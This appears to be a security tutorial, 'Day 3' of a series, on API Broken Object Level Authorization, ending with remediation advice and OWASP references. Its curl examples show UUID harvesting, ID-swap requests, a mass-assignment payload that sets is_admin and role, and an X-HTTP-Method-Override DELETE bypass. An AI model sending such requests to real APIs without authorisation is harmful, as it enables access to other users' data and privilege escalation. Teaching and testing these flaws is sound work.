# 🎯 Day 3: Broken Object Level Authorization (BOLA) & Privilege Escalation

---

## 📘 Overview

**Broken Object Level Authorization (BOLA)** occurs when an API allows an authenticated user to access or manipulate objects they do not own due to missing or improper authorization checks.

---

## 🔐 Authentication vs Authorization

| Concept                | Meaning                                    |
| ---------------------- | ------------------------------------------ |
| Authentication (AuthN) | Who the user is (JWT / session validation) |
| Authorization (AuthZ)  | What the user is allowed to access         |
| BOLA                   | Backend trusts user-supplied object IDs    |

---

## 🧪 Investigation Workflow

---

## 🛠️ Step 1: Identifier Discovery

**Goal:** Identify where object IDs are used in API requests.

### Common Locations

* **Path Parameters**

  ```
  /api/v1/users/101/profile
  ```

* **Query Parameters**

  ```
  /api/v1/download?file_id=999
  ```

* **Request Body**

  ```json
  {
    "order_id": "ORD-44"
  }
  ```

---

## 🛠️ Step 2: ID Harvesting

**Goal:** Collect valid object IDs from public or low-privileged endpoints.

### UUID Extraction Example

```bash
curl -s "https://api.site.com/v1/public/users" \
| grep -E -o "[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}"
```

### Why This Works

* Public APIs often leak internal object references
* UUIDs are assumed secure but frequently exposed

---

## 🛠️ Step 3: BOLA Exploitation (ID Swap)

**Goal:** Access another user’s private data using a valid token.

### ID Swap Test

```bash
curl -X GET "https://api.site.com/v1/messages/TARGET_ID" \
-H "Authorization: Bearer <MY_VALID_TOKEN>"
```

### Vulnerability Indicator

* Other user’s private data returned
* No ownership validation on backend

---

## 🛠️ Step 4: Mass Assignment

**Goal:** Modify sensitive fields not intended for user control.

### Payload Injection

```bash
curl -X PATCH "https://api.site.com/v1/user/update" \
-H "Content-Type: application/json" \
-H "Authorization: Bearer <TOKEN>" \
-d '{
  "username": "new_name",
  "is_admin": true,
  "role": "admin"
}'
```

### Vulnerability Indicator

* Privilege escalation
* Backend blindly maps request body to object model

---

## 🛠️ Step 5: Advanced Authorization Bypass

**Goal:** Bypass authorization checks using method confusion.

### HTTP Method Override

```bash
curl -X POST "https://api.site.com/v1/user/101" \
-H "X-HTTP-Method-Override: DELETE" \
-H "Authorization: Bearer <TOKEN>"
```

### Why This Works

* Gateway validates POST request
* Backend executes overridden method (DELETE)

---

## 🚨 Impact

* Unauthorized data access
* Account takeover
* Privilege escalation
* Full application compromise

---

## 🛡️ Remediation Guidelines

### ✅ Enforce Object Ownership

```
JWT.sub MUST match resource.owner_id
```

### ✅ Prevent Mass Assignment

* Use strict allow-lists
* Never auto-bind request bodies to models

### ✅ Secure Object References

* Use UUID v4
* Do not expose internal IDs in public endpoints

---

## 📚 References

* OWASP API Security Top 10 – API1: Broken Object Level Authorization
* OWASP Mass Assignment Cheat Sheet
